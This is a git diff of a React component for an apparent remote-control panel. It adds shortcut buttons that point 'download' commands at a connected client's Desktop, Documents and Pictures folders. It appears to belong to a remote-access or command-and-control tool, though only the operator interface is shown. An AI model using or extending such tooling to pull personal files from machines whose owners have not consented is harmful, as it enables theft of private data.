@@ -2,6 +2,7 @@ import {Form} from 'react-bootstrap';
 import React, {useState} from "react";
 import {sendCommand, uploadFile} from "../../../api/api";
 import styled from '@emotion/styled';
+import {Input} from "reactstrap";
 
 
 const ClientControlCommand = ({client, commands}) => {
@@ -11,6 +12,7 @@ const ClientControlCommand = ({client, commands}) => {
     const [currentCommand, setCurrentCommand] = useState("stayhome");
     const [errors, setErrors] = useState(null);
     const [sendingCommand, setSendingCommand] = useState(false)
+    const [defaultPaths, setDefaultPaths] = useState("Enter remote path")
 
     async function SendCommand(e) {
         e.preventDefault()
@@ -99,9 +101,20 @@ const ClientControlCommand = ({client, commands}) => {
                     currentCommand === 'download' ?
                         <div className="download-file-wrapper">
                             <Form.Label>Remote path:</Form.Label>
-                            <Form.Control onChange={(e) => {
-                                setAdditionalInput(e.target.value)
-                            }} type="text" placeholder="Enter path"/>
+                            <AutoCompleteDiv>
+                                <SmallLabel>One backslash between directories only</SmallLabel>
+                                <AutoCompleteButton onClick={() => setDefaultPaths(`C:\\`)}>C:\</AutoCompleteButton>
+                                <AutoCompleteButton
+                                    onClick={() => setDefaultPaths(`C:\\Users\\${client.username}\\Desktop`)}>Desktop</AutoCompleteButton>
+                                <AutoCompleteButton
+                                    onClick={() => setDefaultPaths(`C:\\Users\\${client.username}\\Documents`)}>Documents</AutoCompleteButton>
+                                <AutoCompleteButton onClick={() => setDefaultPaths(`C:\\Users\\${client.username}\\Pictures`)}>Pictures</AutoCompleteButton>
+                            </AutoCompleteDiv>
+                            <Input value={defaultPaths} onChange={(e) => {
+                                let replaceableString = String.raw`${e.target.value}`.replace(/\\/g, "\\\\");
+                                setDefaultPaths(e.target.value)
+                                setAdditionalInput(replaceableString)
+                            }} type="text"/>
                         </div> : null
             }
             <div className="client-control-command-buttons">
@@ -122,12 +135,31 @@ const ClientControlCommand = ({client, commands}) => {
 export default ClientControlCommand;
 
 const SendButton = styled.button`
-    padding: 0.5em;
-    min-width: 8em;
-    border-radius: 5px;
-    border: none;
-    cursor: pointer;
-    color: #fff;
-    font-weight: 600;
-    background-color: #98d14a;
+  padding: 0.5em;
+  min-width: 8em;
+  border-radius: 5px;
+  border: none;
+  cursor: pointer;
+  color: #fff;
+  font-weight: 600;
+  background-color: #98d14a;
+`
+const SmallLabel = styled.p`
+  color: #adadad;
+  font-size: 0.8em;
+  margin-left: 5px;
+`
+const AutoCompleteButton = styled.button`
+  padding: 0.2em;
+  margin-left: 5px;
+  min-width: 2em;
+  border-radius: 5px;
+  border: none;
+  cursor: pointer;
+  color: #fff;
+  font-weight: 600;
+  background-color: #98d14a;
+`
+const AutoCompleteDiv = styled.div`
+  padding-bottom: 0.5vh;
 `
